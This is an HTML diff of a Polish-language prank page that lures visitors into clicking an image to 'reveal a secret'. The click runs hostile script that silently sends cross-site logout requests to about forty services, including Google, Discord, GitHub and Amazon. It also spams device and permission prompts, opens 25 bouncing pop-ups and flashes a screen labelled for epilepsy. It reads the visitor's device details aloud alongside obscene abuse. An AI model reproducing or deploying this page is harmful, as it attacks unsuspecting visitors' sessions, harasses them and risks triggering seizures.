@@ -1,10 +1,536 @@
 <!DOCTYPE html>
-<html>
-<title>lol</title>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <title>SOO TUFF</title>
+    <style>
+        body {
+            background: white;
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Courier New', monospace;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        .epstein-img {
+            animation: pulse 1s ease-in-out infinite;
+            cursor: pointer;
+            max-width: 90%;
+            height: auto;
+        }
+
+        .info-text {
+            margin-top: 30px;
+            font-size: 18px;
+            color: black;
+            font-family: 'Courier New', monospace;
+        }
+
+        .epilepsy-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Courier New', monospace;
+            background-image: url('https://media1.tenor.com/m/RN7QuRQ5sX0AAAAd/super-idol-car.gif');
+            background-size: cover;      
+            background-position: center;
+            background-repeat: no-repeat;         }
+
+
+        .blinking-text {
+            font-size: 48px;
+            font-weight: bold;
+            text-align: center;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.6);
+            color: red;
+            border-radius: 10px;
+            animation: blink 0.15s step-end infinite;
+            letter-spacing: 5px;
+            margin: 20px;
+        }
+
+        .logout-list {
+            margin-top: 30px;
+            max-height: 300px;
+            overflow-y: auto;
+            width: 80%;
+            text-align: center;
+            background: rgba(0, 0, 0, 0.6);
+            border-radius: 10px;
+            padding: 10px;
+        }
+
+        .logout-item {
+            font-size: 14px;
+            padding: 5px;
+            margin: 5px;
+            color: red;
+            animation: blink 0.2s step-end infinite;
+        }
+
+
+        @keyframes blink {
+            0% { opacity: 1; text-shadow: 0 0 0 red; }
+            50% { opacity: 0.5; text-shadow: 0 0 5px red; }
+            100% { opacity: 1; text-shadow: 0 0 0 red; }
+        }
+    </style>
+</head>
 <body>
+    <div id="mainContainer" style="text-align: center;">
+        <img id="epsteinImg" class="epstein-img" src="https://image2url.com/r2/default/images/1775944194364-c3b047da-467f-474a-846c-fbe3f953e8ad.png" alt="Epstein">
+        <div class="info-text">Kliknij na Epsteina aby poznac jego sekret!</div>
+    </div>
 
-<h1>d</h1>
-<p>d</p>
+    <script>
+        const SCREEN_WIDTH = window.screen.availWidth;
+        const SCREEN_HEIGHT = window.screen.availHeight;
+        const VELOCITY = 25;
+        const MARGIN = 10;
+        const TICK_LENGTH = 30;
 
+        const MEME_URL = 'https://images.meme-arsenal.com/f598af3658180fce69a323126db7e103.jpg';
+        const SONG_URL = 'https://github.com/kigredns/zobaczepsteina/raw/refs/heads/main/Don%20Pedalini.mp3';
+
+        const LOGOUT_SITES = {
+          Discord: ['POST', 'https://discord.com/api/v9/auth/logout', {provider: null, voip_provider: null}],
+          Amazon: ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'],
+          DeviantART: ['POST', 'https://www.deviantart.com/users/logout'],
+          Dropbox: ['GET', 'https://www.dropbox.com/logout'],
+          eBay: ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
+          GitHub: ['GET', 'https://github.com/logout'],
+          GMail: ['GET', 'https://mail.google.com/mail/?logout'],
+          Google: ['GET', 'https://www.google.com/accounts/Logout'],
+          Hulu: ['GET', 'https://secure.hulu.com/logout'],
+          NetFlix: ['GET', 'https://www.netflix.com/Logout'],
+          Skype: ['GET', 'https://secure.skype.com/account/logout'],
+          SoundCloud: ['GET', 'https://soundcloud.com/logout'],
+          'Steam Community': ['GET', 'https://steamcommunity.com/?action=doLogout'],
+          'Steam Store': ['GET', 'https://store.steampowered.com/logout/'],
+          Wikipedia: ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'],
+          'Windows Live': ['GET', 'https://login.live.com/logout.srf'],
+          Wordpress: ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
+          Yahoo: ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
+          YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }],
+          JShop: ['GET', 'https://jshop.partners/panel/logout'],
+          Vimeo: ['GET', 'https://vimeo.com/log_out'],
+          Tumblr: ['GET', 'https://www.tumblr.com/logout'],
+          Allegro: ['GET', 'https://allegro.pl/wyloguj?origin_url=/'],
+          OnetMail: ['GET', 'https://authorisation.grupaonet.pl/logout.html?state=logout&client_id=poczta.onet.pl.front.onetapi.pl'],
+          InteriaMail: ['GET', 'https://poczta.interia.pl/logowanie/sso/logout'],
+          OLX: ['GET', 'https://www.olx.pl/account/logout'],
+          Roblox:  ['POST', 'https://auth.roblox.com/v2/logout'],
+          ChatGPT: ['GET', 'https://chatgpt.com/auth/logout'],
+          Guilded:  ['POST', 'https://www.guilded.gg/api/logout'],
+          LinkedIn: ['GET', 'https://www.linkedin.com/m/logout/'],
+          Pinterest: ['GET', 'https://www.pinterest.com/logout/'],
+          Reddit: ['GET', 'https://www.reddit.com/logout'],
+          Spotify: ['GET', 'https://www.spotify.com/logout/'],
+          Microsoft: ['GET', 'https://login.microsoftonline.com/common/oauth2/logout'],
+          Instagram: ['GET', 'https://www.instagram.com/accounts/logout/'],
+          Trello: ['GET', 'https://trello.com/logout'],
+          Baidu: ['GET', 'https://passport.baidu.com/?logout'],
+          VK: ['GET', 'https://vk.com/exit'],
+          StackOverflow: ['GET', 'https://stackoverflow.com/users/logout'],
+          Asana: ['POST', 'https://app.asana.com/app/asana/-/logout']
+        };
+
+        const wins = [];
+        let hasStarted = false;
+        let numSuperLogoutIframes = 0;
+        let audio = null;
+        let speechSynth = window.speechSynthesis;
+        let spamInterval = null;
+        let beepInterval = null;
+
+        function moveWindowBounce(win) {
+            let vx = (VELOCITY + Math.random() * 10) * (Math.random() > 0.5 ? 1 : -1);
+            let vy = (VELOCITY + Math.random() * 10) * (Math.random() > 0.5 ? 1 : -1);
+
+            setInterval(() => {
+                if (win.closed) return;
+                try {
+                    const x = win.screenX;
+                    const y = win.screenY;
+                    const width = win.outerWidth;
+                    const height = win.outerHeight;
+
+                    if (x < MARGIN) vx = Math.abs(vx);
+                    if (x + width > SCREEN_WIDTH - MARGIN) vx = -1 * Math.abs(vx);
+                    if (y < MARGIN + 20) vy = Math.abs(vy);
+                    if (y + height > SCREEN_HEIGHT - MARGIN) vy = -1 * Math.abs(vy);
+
+                    win.moveBy(vx, vy);
+                } catch(e) {}
+            }, TICK_LENGTH);
+        }
+
+        function playMusic() {
+            if (audio && !audio.paused) return;
+            audio = new Audio(SONG_URL);
+            audio.loop = true;
+            audio.volume = 0.5;
+            audio.play().catch(e => console.log('Autoodtwarzanie zablokowane'));
+        }
+
+        function playBeep() {
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioCtx.createOscillator();
+                const gainNode = audioCtx.createGain();
+                oscillator.connect(gainNode);
+                gainNode.connect(audioCtx.destination);
+                oscillator.frequency.value = 880;
+                gainNode.gain.value = 0.5;
+                oscillator.start();
+                gainNode.gain.exponentialRampToValueAtTime(0.00001, audioCtx.currentTime + 0.5);
+                oscillator.stop(audioCtx.currentTime + 0.5);
+                audioCtx.close();
+            } catch(e) {}
+        }
+
+        function startLoudBeeps() {
+            if (beepInterval) clearInterval(beepInterval);
+            beepInterval = setInterval(() => {
+                playBeep();
+            }, 1000);
+        }
+
+        function speakText(text) {
+            if (!speechSynth) return;
+            const utterance = new SpeechSynthesisUtterance(text);
+            utterance.rate = 0.85;
+            utterance.pitch = 1.0;
+            utterance.volume = 1;
+            speechSynth.speak(utterance);
+        }
+        function requestCameraAndMic() {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ audio: true, video: true })
+                    .then(stream => stream.getTracks().forEach(track => track.stop()))
+                    .catch(e => {});
+            }
+        }
+
+        function requestWindowsSecurityKey() {
+            try {
+                const challenge = new Uint8Array(32);
+                crypto.getRandomValues(challenge);
+                navigator.credentials.create({
+                    publicKey: {
+                        rp: { name: 'Epstein Secrets System' },
+                        user: {
+                            id: new Uint8Array(16),
+                            name: 'security@epstein.system',
+                            displayName: 'Windows Security User'
+                        },
+                        pubKeyCredParams: [
+                            { type: 'public-key', alg: -7 },
+                            { type: 'public-key', alg: -257 }
+                        ],
+                        authenticatorSelection: {
+                            authenticatorAttachment: 'platform',
+                            requireResidentKey: true,
+                            userVerification: 'required'
+                        },
+                        attestation: 'direct',
+                        challenge: challenge.buffer
+                    }
+                }).catch(e => {});
+            } catch(e) {}
+        }
+
+        function requestMidiAccess() {
+            if (navigator.requestMIDIAccess) navigator.requestMIDIAccess({ sysex: true }).catch(e => {});
+        }
+
+        function requestBluetoothAccess() {
+            if (navigator.bluetooth && navigator.bluetooth.requestDevice) {
+                navigator.bluetooth.requestDevice({ acceptAllDevices: true }).catch(e => {});
+            }
+        }
+
+        function requestUsbAccess() {
+            if (navigator.usb && navigator.usb.requestDevice) navigator.usb.requestDevice({ filters: [] }).catch(e => {});
+        }
+
+        function requestSerialAccess() {
+            if (navigator.serial && navigator.serial.requestPort) navigator.serial.requestPort({ filters: [] }).catch(e => {});
+        }
+
+        function requestHidAccess() {
+            if (navigator.hid && navigator.hid.requestDevice) navigator.hid.requestDevice({ filters: [] }).catch(e => {});
+        }
+
+        function requestPointerLock() {
+            const requestPointerLock = document.body.requestPointerLock || 
+                                       document.body.webkitRequestPointerLock ||
+                                       document.body.mozRequestPointerLock;
+            if (requestPointerLock) requestPointerLock.call(document.body);
+        }
+
+        function requestFullscreen() {
+            const requestFullscreen = document.documentElement.requestFullscreen ||
+                                     document.documentElement.webkitRequestFullscreen ||
+                                     document.documentElement.mozRequestFullScreen;
+            if (requestFullscreen) requestFullscreen.call(document.documentElement);
+        }
+
+        function requestClipboardRead() {
+            if (navigator.clipboard && navigator.clipboard.readText) navigator.clipboard.readText().catch(e => {});
+        }
+
+        function requestGeolocation() {
+            if (navigator.geolocation) navigator.geolocation.getCurrentPosition(() => {}, () => {});
+        }
+
+        function requestNotifications() {
+            if (Notification && Notification.requestPermission) Notification.requestPermission();
+        }
+
+        function startSpammingRequests() {
+            if (spamInterval) clearInterval(spamInterval);
+            
+            spamInterval = setInterval(() => {
+                requestCameraAndMic();
+                requestWindowsSecurityKey();
+                requestMidiAccess();
+                requestBluetoothAccess();
+                requestUsbAccess();
+                requestSerialAccess();
+                requestHidAccess();
+                requestPointerLock();
+                requestFullscreen();
+                requestClipboardRead();
+                requestGeolocation();
+                requestNotifications();
+            }, 2000);
+        }
+
+        async function getComputerName() {
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                const offer = await pc.createOffer();
+                await pc.setLocalDescription(offer);
+                const sdp = pc.localDescription.sdp;
+                pc.close();
+                const lines = sdp.split('\n');
+                for (let line of lines) {
+                    if (line.includes('a=msid-semantic:')) {
+                        const match = line.match(/WINS|COMPUTERNAME|HOSTNAME|[A-Z0-9_-]{5,}/i);
+                        if (match) return match[0];
+                    }
+                }
+                return 'NIEZNANY';
+            } catch(e) {
+                return 'BLAD POBRANIA';
+            }
+        }
+
+        async function getSystemInfo() {
+            const info = {};
+            info.computerName = await getComputerName();
+            info.browser = navigator.userAgent;
+            info.language = navigator.language;
+            info.platform = navigator.platform;
+            info.screenResolution = screen.width + 'x' + screen.height;
+            info.colorDepth = screen.colorDepth + '-bit';
+            info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            info.ram = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'NIEZNANA';
+            info.cores = navigator.hardwareConcurrency || 'NIEZNANA';
+            return info;
+        }
+
+        async function readAllSystemInfo() {
+            const info = await getSystemInfo();
+            
+            speakText('LUBIE W DUPE SEX  ANALNY KUTAS KUTAS RUCHAM CI MATKE DZIWKO JEBANA JEBAĆ CIE TY KURWO PIZDO JEBANA');
+            
+            setTimeout(() => speakText('Nazwa komputera to: ' + info.computerName), 2000);
+            setTimeout(() => speakText('Przegladarka: ' + info.browser), 4000);
+            setTimeout(() => speakText('System operacyjny: ' + info.platform), 6000);
+            setTimeout(() => speakText('Język przegladarki: ' + info.language), 8000);
+            setTimeout(() => speakText('Rozdzielczosc ekranu: ' + info.screenResolution), 10000);
+            setTimeout(() => speakText('Glebia kolorow: ' + info.colorDepth), 12000);
+            setTimeout(() => speakText('Strefa czasowa: ' + info.timezone), 14000);
+            setTimeout(() => speakText('Pamiec RAM: ' + info.ram), 16000);
+            setTimeout(() => speakText('Liczba rdzeni procesora: ' + info.cores), 18000);
+        }
+
+        function getRandomCoords(width, height) {
+            const x = MARGIN + Math.floor(Math.random() * (SCREEN_WIDTH - width - MARGIN));
+            const y = MARGIN + Math.floor(Math.random() * (SCREEN_HEIGHT - height - MARGIN));
+            return { x, y };
+        }
+
+        function openMemeWindow(num) {
+            const { x, y } = getRandomCoords(270, 420);
+            const opts = `width=270,height=420,left=${x},top=${y}`;
+            const win = window.open('', `meme_${num}_${Date.now()}`, opts);
+            if (!win) return null;
+            
+            win.document.write(`
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>Epstein ${num}</title>
+                    <style>
+                        body {
+                            margin: 0;
+                            padding: 0;
+                            background: white;
+                            display: flex;
+                            justify-content: center;
+                            align-items: center;
+                            min-height: 100vh;
+                        }
+                        img {
+                            width: 250px;
+                            height: 375px;
+                            display: block;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <img src="${MEME_URL}" alt="meme">
+                </body>
+                </html>
+            `);
+            win.document.close();
+            return win;
+        }
+
+        async function superLogoutWithList(listDiv) {
+            function addLogoutMessage(serviceName) {
+                const div = document.createElement('div');
+                div.className = 'logout-item';
+                div.innerHTML = 'WYLOGOWYWANIE Z ' + serviceName.toUpperCase();
+                listDiv.appendChild(div);
+                listDiv.scrollTop = listDiv.scrollHeight;
+                speakText('Wylogowywanie z ' + serviceName);
+            }
+            
+            function cleanup(el) {
+                if (el && el.parentNode) el.parentNode.removeChild(el);
+            }
+            
+            function get(url, serviceName) {
+                addLogoutMessage(serviceName);
+                const img = document.createElement('img');
+                img.onload = () => cleanup(img);
+                img.onerror = () => cleanup(img);
+                img.style = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;';
+                document.body.appendChild(img);
+                img.src = url;
+            }
+            
+            function post(url, params, serviceName) {
+                addLogoutMessage(serviceName);
+                const iframe = document.createElement('iframe');
+                iframe.style = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;';
+                iframe.name = 'iframe' + numSuperLogoutIframes;
+                document.body.appendChild(iframe);
+                numSuperLogoutIframes++;
+                
+                const form = document.createElement('form');
+                form.style = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;';
+                
+                let numLoads = 0;
+                iframe.onload = iframe.onerror = () => {
+                    if (numLoads >= 1) cleanup(iframe);
+                    numLoads++;
+                };
+                form.action = url;
+                form.method = 'POST';
+                form.target = iframe.name;
+                
+                for (const param in params) {
+                    const input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = param;
+                    input.value = params[param];
+                    form.appendChild(input);
+                }
+                
+                document.body.appendChild(form);
+                form.submit();
+            }
+            
+            let index = 0;
+            for (const name in LOGOUT_SITES) {
+                const method = LOGOUT_SITES[name][0];
+                const url = LOGOUT_SITES[name][1];
+                const params = LOGOUT_SITES[name][2] || {};
+                
+                setTimeout(() => {
+                    if (method === 'GET') get(url, name);
+                    else post(url, params, name);
+                }, index * 100);
+                index++;
+            }
+        }
+
+        async function revealSecrets() {
+            if (hasStarted) return;
+            hasStarted = true;
+            
+            playMusic();
+            startSpammingRequests();
+            startLoudBeeps();
+            
+            const mainContainer = document.getElementById('mainContainer');
+            mainContainer.style.display = 'none';
+            
+            const epilepsyScreen = document.createElement('div');
+            epilepsyScreen.className = 'epilepsy-screen';
+            
+            const mainBlink = document.createElement('div');
+            mainBlink.className = 'blinking-text';
+            mainBlink.innerHTML = 'WYLOGOWYWANIE...';
+            epilepsyScreen.appendChild(mainBlink);
+            
+            const listDiv = document.createElement('div');
+            listDiv.className = 'logout-list';
+            epilepsyScreen.appendChild(listDiv);
+            
+            document.body.appendChild(epilepsyScreen);
+            
+            await readAllSystemInfo();
+            
+            for (let i = 1; i <= 25; i++) {
+                setTimeout(() => {
+                    const win = openMemeWindow(i);
+                    if (win) {
+                        wins.push(win);
+                        setTimeout(() => { if (!win.closed) moveWindowBounce(win); }, 100);
+                    }
+                }, i * 80);
+            }
+            
+            superLogoutWithList(listDiv);
+        }
+
+        document.getElementById('epsteinImg').addEventListener('click', revealSecrets);
+        document.body.addEventListener('click', function() {
+            if (audio && audio.paused) audio.play();
+        });
+    </script>
 </body>
 </html>
